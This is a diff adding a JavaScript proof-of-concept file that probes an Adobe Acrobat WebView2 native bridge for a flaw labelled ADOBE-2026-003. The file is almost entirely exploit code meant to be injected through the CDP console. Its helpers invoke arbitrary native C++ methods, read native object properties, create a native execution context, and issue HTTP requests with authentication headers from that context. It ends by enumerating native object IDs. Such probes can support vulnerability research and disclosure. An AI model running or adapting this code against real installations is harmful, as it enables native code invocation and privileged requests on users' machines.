@@ -1,0 +1,70 @@
+/**
+ * adobe_acrojs_probe.js — AcroJS native bridge probe
+ * Inject it in the CDP console of any RNA panel.
+ * Demonstrates ADOBE-2026-003: arbitrary C++ function invocation.
+ */
+
+// 1. Verify the bridge is available
+console.log("[*] Bridge available:", typeof window.nativepostmessage);
+// Expected output: "Bridge available: function"
+
+// 2. Invocation protocol: call a native method by object ID
+function acroInvoke(objectId, methodName, args) {
+    const msg = {
+        isAcroMsg: "YES",        // Mandatory marker
+        method_name: "invoke",    // Operation type
+        funArgs: {
+            "0": objectId,        // Object ID in g_acroJSObjMap
+            "1": methodName,      // C++ method name to invoke
+            "2": args || {}       // Method arguments
+        },
+        response_id: "probe_" + Date.now()  // Response correlation
+    };
+    window.nativepostmessage(JSON.stringify(msg));
+}
+
+// 3. Read protocol: get properties of native objects
+function acroGet(objectId, propertyName) {
+    const msg = {
+        isAcroMsg: "YES",
+        method_name: "get",
+        funArgs: {
+            "0": objectId,
+            "1": propertyName
+        },
+        response_id: "get_" + Date.now()
+    };
+    window.nativepostmessage(JSON.stringify(msg));
+}
+
+// 4. Create a native execution context
+function acroCreateContext() {
+    const msg = {
+        isAcroMsg: "YES",
+        method_name: "createContext",
+        funArgs: {},
+        response_id: "ctx_" + Date.now()
+    };
+    window.nativepostmessage(JSON.stringify(msg));
+}
+
+// 5. Execute HTTP request from the native context
+// (with authentication headers the WebView2 could not add)
+function acroXHR(url, method, headers) {
+    const msg = {
+        isAcroMsg: "YES",
+        method_name: "performXHRRequest",
+        funArgs: {
+            "0": { url: url, method: method || "GET", headers: headers || {} }
+        },
+        response_id: "xhr_" + Date.now()
+    };
+    window.nativepostmessage(JSON.stringify(msg));
+}
+
+// 6. Enumerate the objects registered in g_acroJSObjMap
+// Known IDs are 3, 7 and 18
+[3, 7, 18].forEach(id => {
+    console.log(`[*] Probing object ID ${id}...`);
+    acroGet(id, "toString");
+});
